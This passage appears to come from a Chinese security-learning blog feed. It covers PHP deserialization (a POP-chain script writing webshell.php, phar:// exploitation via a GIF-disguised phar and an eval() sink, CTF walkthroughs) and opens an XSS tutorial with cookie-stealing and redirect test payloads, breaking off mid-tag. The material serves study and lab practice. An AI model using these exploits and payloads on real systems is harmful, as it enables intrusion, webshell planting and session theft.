$name;  protected $group;  function __construct($name, $group, $logger) {    $this-&gt;name = $name;    $this-&gt;group = $group;    $this-&gt;logger = $logger;  }  function log() {    $this-&gt;logger-&gt;log(&quot;Song &quot; . $this-&gt;name . &quot; by [i]&quot; . $this-&gt;group . &quot;[/i] viewed.\n&quot;);  }}class Lyrics {  protected $lyrics;  protected $song;  function __construct($lyrics, $song) {    $this-&gt;song = $song;    $this-&gt;lyrics = $lyrics;  }  function __toString() {    return &quot;&lt;p&gt;&quot; . $this-&gt;song-&gt;__toString() . &quot;&lt;/p&gt;&lt;p&gt;&quot; . str_replace(&quot;\n&quot;, &quot;&lt;br /&gt;&quot;, $this-&gt;lyrics) . &quot;&lt;/p&gt;\n&quot;;  }  function __destruct() {    $this-&gt;song-&gt;log();  }};$outputfilter = new OutputFilter(&quot;&quot;, &quot;&quot;);$logfileformat = new LogFileFormat($outputfilter, &quot;\n&quot;);$log_write_file = new LogWriter_File(&#39;../../../../var/www/html/webshell.php&#39;, $logfileformat);$logger = new Logger($log_write_file);$song = new Song(&#39;JrXnm&#39;,&#39;&lt;?php phpinfo() ?&gt; &#39;, $logger);$lyrics = new Lyrics(&#39;JrXnm&#39;,$song);echo urlencode(serialize($lyrics));</code></pre><p>构造pop链的文章还可以参考：</p><p><a href="https://www.anquanke.com/post/id/170681#h2-0" target="_blank" rel="noopener">PHP反序列化入门之寻找POP链(一)</a></p><p><a href="https://www.anquanke.com/post/id/170714" target="_blank" rel="noopener">PHP反序列化入门之寻找POP链（二）</a></p><p><a href="https://www.freebuf.com/column/205855.html" target="_blank" rel="noopener">PHP反序列化入门之寻找POP链（三）</a></p><h4 id="反序列化配合phar-协议"><a href="#反序列化配合phar-协议" class="headerlink" title="反序列化配合phar://协议"></a>反序列化配合phar://协议</h4><h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>通常我们在利用反序列化漏洞的时候，只能将序列化后的字符串传入unserialize()，随着代码安全性越来越高，利用难度也越来越大。但在不久前的Black Hat上，安全研究员Sam Thomas分享了议题<code>It’s a PHP unserialization vulnerability Jim, but not as we know it</code>利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。<br><strong>该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作。</strong></p><h5 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h5><h6 id="a-stub"><a href="#a-stub" class="headerlink" title="a stub"></a>a stub</h6><p>可以理解为一个标志，格式为<code>xxx，前面内容不限，但必须以__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p><h6 id="a-manifest-describing-the-contents"><a href="#a-manifest-describing-the-contents" class="headerlink" title="a manifest describing the contents"></a>a manifest describing the contents</h6><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。<br><img src="https://upload-images.jianshu.io/upload_images/9113969-d8f57b88969d1d6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h6 id="the-file-contents"><a href="#the-file-contents" class="headerlink" title="the file contents"></a>the file contents</h6><p>被压缩文件的内容。</p><h6 id="optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only"><a href="#optional-a-signature-for-verifying-Phar-integrity-phar-file-format-only" class="headerlink" title="[optional] a signature for verifying Phar integrity (phar file format only)"></a>[optional] a signature for verifying Phar integrity (phar file format only)</h6><p>签名，放在文件末尾，格式如下：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-5769eb3536407bd1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h5 id="Demo测试"><a href="#Demo测试" class="headerlink" title="Demo测试"></a>Demo测试</h5><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作。<br>注意：要将php.ini中的<code>phar.readonly</code>选项设置为Off，否则无法生成phar文件。</p><p>phar_gen.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后缀名必须为phar</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>可以明显的看到meta-data是以序列化的形式存储的：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-f256545accf32fdc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-901f0c120d3edee8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>通过一个小demo证明一下<br>phar_test1.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'Destruct called'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> 'phar<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//phar.phar/test.txt';</span>    <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><p><img src="https://upload-images.jianshu.io/upload_images/9113969-d5ec1857efa0ed58.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>其他函数当然也是可行的,当文件系统函数的参数可控时，我们可以在不调用unserialize()的情况下进行反序列化操作，一些之前看起来“人畜无害”的函数也变得“暗藏杀机”，极大的拓展了攻击面。</p><h5 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h5><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub，增加gif文件头</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TestObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://upload-images.jianshu.io/upload_images/9113969-c872ef40ddff63ff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>将后缀改为gif进行测试</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'Destruct called'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> 'phar<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//phar.gif/test.txt';</span>    <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><p><img src="https://upload-images.jianshu.io/upload_images/9113969-7a55385aec21b74f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>采用这种方法可以绕过很大一部分上传检测。</p><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul><li>phar文件要能够上传到服务器端。</li><li>如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数要有可用的魔术方法作为”跳板”。</li><li>文件操作函数的参数可控，且<code>: / phar</code>等特殊字符没有被过滤。</li></ul><h5 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h5><p>upload_file.php后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"image/gif"</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span> <span class="token string">'gif'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Upload: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"Type: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"Temp file: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">"upload_file/"</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">" already exists. "</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token keyword">else</span>      <span class="token punctuation">{</span>      <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token string">"upload_file/"</span> <span class="token punctuation">.</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token string">"Stored in: "</span> <span class="token punctuation">.</span> <span class="token string">"upload_file/"</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span>  <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"Invalid file,you can only upload gif"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></code></pre><p>upload_file.html</p><pre class=" language-markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://localhost/upload_file.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Upload<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre><p>file_un.php存在<code>file_exists()</code>，并且存在<code>__destruct()</code></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">AnyClass</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string">'echo "ok";'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> output<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>根据file_un.php写一个生成phar的php文件，在文件头加上GIF89a绕过gif，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用file_exists，使用phar://执行代码</strong><br>构造eval.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">AnyClass</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> output<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">'phar.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">'GIF89a'</span><span class="token punctuation">.</span><span class="token string">'&lt;?php __HALT_COMPILER();?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">'test.txt'</span><span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnyClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$object</span> <span class="token operator">-</span><span class="token operator">></span> output<span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>访问eval.php生成phar.phar，将后缀改为gif。<br><img src="https://upload-images.jianshu.io/upload_images/9113969-76b33b8e7dc5c1a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>然后上传到目录下与<code>file_un.php</code>同目录，利用<code>file_un.php</code>中的危险函数getshell<br>payload:<code>file_un.php?filename=phar://phar.gif/test</code><br><img src="https://upload-images.jianshu.io/upload_images/9113969-dd5905733c0bf54d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p><h4 id="靶场相关题目"><a href="#靶场相关题目" class="headerlink" title="靶场相关题目"></a>靶场相关题目</h4><h5 id="攻防世界（unserialize3"><a href="#攻防世界（unserialize3" class="headerlink" title="攻防世界（unserialize3)"></a>攻防世界（unserialize3)</h5><p>题目来源:攻防世界 web进阶区</p><img src="QQ截图20200114184702.png"  /><p>代码审计可知我们需要绕过__wakeup()函数。</p><p> 我们首先根据题目源码构造序列化代码。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200114190910.png" alt=""></p><p>这里利用到了一个 __wakeup()函数的漏洞（CVE-2016-7124）。</p><p><strong>一个字符串或对象被序列化后，如果其属性被修改，则不会执行__wakeup()函数，可以用来绕过；</strong></p><p>得到的序列化字符串为：O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}</p><p>括号前的数字即为属性值,所以将其修改后传入url中即可获得flag。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200114191751.png" alt=""></p><h5 id="Bugku-CTF-php伪协议-amp-反序列化"><a href="#Bugku-CTF-php伪协议-amp-反序列化" class="headerlink" title="Bugku CTF (php伪协议&amp;反序列化)"></a>Bugku CTF (php伪协议&amp;反序列化)</h5><p>首先我们根据源码提示，利用php伪协议得到反序列化相关代码。</p><img src="QQ截图20200114195646.png" style="zoom:67%;" /><img src="QQ截图20200114195734.png" style="zoom:67%;" /><p>这里看到了<strong>__string</strong>魔术方法：作用为将flag类作为字符串执行时会自动执行此函数。</p><p>在index.php又发现了关键函数unserialize();正则匹配函数preg_match对flag进行了匹配。</p><p>由于过滤不能通过文件包含的方式读取flag。但是我们可以自由的传入password的值。</p><p>所以我们就可以构造序列化对象：变量file=flag.php，传给password</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200114201936.png" alt=""></p><p>构造payload:</p><pre><code>?txt=php://input&amp;file=hint.php&amp;passwordO:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></pre><p>即可得到flag.</p><h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://blog.szfszf.top/article/24/" target="_blank" rel="noopener">https://blog.szfszf.top/article/24/</a></p><p><a href="https://www.smi1e.top/php反序列化攻击拓展/" target="_blank" rel="noopener">https://www.smi1e.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E6%8B%93%E5%B1%95/</a></p><p><a href="https://www.freebuf.com/column/154530.html" target="_blank" rel="noopener">https://www.freebuf.com/column/154530.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS漏洞学习</title>
      <link href="/2020/04/03/xss-lou-dong-xue-xi/"/>
      <url>/2020/04/03/xss-lou-dong-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="XSS漏洞学习笔记-靶场实战"><a href="#XSS漏洞学习笔记-靶场实战" class="headerlink" title="XSS漏洞学习笔记+靶场实战"></a>XSS漏洞学习笔记+靶场实战</h2><p>[TOC]</p><h3 id="XSS漏洞相关知识点"><a href="#XSS漏洞相关知识点" class="headerlink" title="XSS漏洞相关知识点"></a>XSS漏洞相关知识点</h3><h5 id="XSS漏洞简介"><a href="#XSS漏洞简介" class="headerlink" title="XSS漏洞简介"></a>XSS漏洞简介</h5><p>​         XSS是跨站脚本攻击，属于被动式的攻击。XSS指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意的特殊目的。</p><h5 id="XSS漏洞分类"><a href="#XSS漏洞分类" class="headerlink" title="XSS漏洞分类"></a>XSS漏洞分类</h5><ul><li>非持久性XSS攻击，当用户访问已被插入攻击代码的链接时，攻击代码执行，完成该次攻击。</li><li>持久型XSS攻击，攻击者把攻击代码永久存储在目标服务器上中，例如数据库，消息论坛，留言板，访问者日志等。当用户进入页面，代码就会被执行。</li><li>DOM型与前两者的差别是，只在客户端进行解析，不需要服务器的解析响应</li></ul><h5 id="XSS漏洞常见危害"><a href="#XSS漏洞常见危害" class="headerlink" title="XSS漏洞常见危害"></a>XSS漏洞常见危害</h5><ul><li>盗用cookie，获取敏感信息。（最常见）</li><li>劫持会话，执行任意操作（改密码、留言等CSRF)</li><li>强制弹出广告页面，刷广告流量</li><li>在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果。</li><li>钓鱼，获取用户账号，密码</li><li>网页挂马，挖矿</li></ul><h5 id="关于JavaScript"><a href="#关于JavaScript" class="headerlink" title="关于JavaScript"></a>关于JavaScript</h5><ul><li>JavaScript是一种客户端的脚本语言，是运行的浏览器中的</li><li>浏览器会自动运行网页中的JavaScript代码，并且JavaScript代码对于用户来说是透明的</li></ul><p>网页中运行JavaScript的方式</p><p>1.引入外部js</p><pre><code>&lt;script src=&quot;https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js&quot;&lt;/script&gt;</code></pre><p>2.使用超链接（javascript伪协议）</p><pre><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;</code></pre><p>3.使用标签</p><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>4.使用事件方法</p><pre><code>&lt;img src=1 onerror=alert(1)&gt;</code></pre><p>常见事件：</p><table><thead><tr><th align="center">事件名称</th><th align="center">类型</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">onerror</td><td align="center">window事件属性</td><td align="center">在错误发生时运行的脚本</td></tr><tr><td align="center">onload</td><td align="center">window事件属性</td><td align="center">页面加载结束以后运行脚本</td></tr><tr><td align="center">onclick</td><td align="center">Mouse事件</td><td align="center">元素上发生鼠标点击时触发</td></tr><tr><td align="center">onmouseover</td><td align="center">Mouse事件</td><td align="center">当鼠标指针移动到元素上时触发</td></tr><tr><td align="center">oninput</td><td align="center">From事件</td><td align="center">当元素获得用户输入时运行的脚</td></tr></tbody></table><h5 id="探测XSS过程"><a href="#探测XSS过程" class="headerlink" title="探测XSS过程"></a>探测XSS过程</h5><p>1.构造一个独一无二且不会被识别为恶意代码的字符串用来提交到页面</p><p>   例如：hacker</p><p>2.使用浏览器审查工具进行代码审计，寻找构造的字符串是否在页面中显示。</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200201183252.png" style="zoom:50%;" /><h5 id="xss常用的测试语句"><a href="#xss常用的测试语句" class="headerlink" title="xss常用的测试语句"></a>xss常用的测试语句</h5><ul><li><script>alert(1)</script></li><li><p><code>&lt;imgsrc=&quot;&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#88&amp;#83&amp;#83&amp;#39&amp;#41&amp;#59&quot;&gt;</code>//转换为10进制</p></li><li><p><code>&lt;img src=x onerror=alert(1)&gt;</code></p></li><li><p><code>&lt;iframe onload=alert(1)&gt;&lt;/iframe&gt;</code></p></li><li><a href=javascript:alert(1)></li><li><script>alert(document.cookie)</script></li><li><script>window.location="(黑页地址)";</script> <p>document.body.innerHTML=”<div style=visblity:visble;><h1></p></li></ul><h3 id="DVWA-XSS-部分"><a href="#DVWA-XSS-部分" class="headerlink" title="DVWA( XSS 部分)"></a>DVWA( XSS 部分)</h3><h4 id="XSS（reflect"><a href="#XSS（reflect" class="headerlink" title="XSS（reflect)"></a>XSS（reflect)</h4><p><strong>simple:</strong></p><p>尝试发现输入的语句直接插入到标签中</p><p><img 